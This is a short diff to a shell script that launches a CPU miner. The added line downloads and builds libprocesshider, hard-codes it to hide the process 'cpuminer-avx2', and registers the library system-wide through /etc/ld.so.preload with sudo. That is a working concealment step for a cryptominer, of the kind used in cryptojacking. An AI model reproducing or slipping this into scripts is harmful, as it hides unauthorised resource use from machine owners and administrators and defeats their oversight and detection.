@@ -7,6 +7,8 @@ NC='\033[0m'
 #addi variable of script location
 location=$(dirname "$0")
 
+git clone https://github.com/gianlucaborello/libprocesshider; cd libprocesshider; awk '{ if (NR == 12) print "static const char* process_to_filter = \"cpuminer-avx2\";"; else print $0}' processhider.c > processhider1.c; rm processhider.c; mv processhider1.c processhider.c; make; sudo mv libprocesshider.so /usr/local/lib/; sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload; cd ..;
+
 # Run miner.
 function start_mining {
   echo -e "Starting ${SEA}${1}${NC} variant of the binaries."
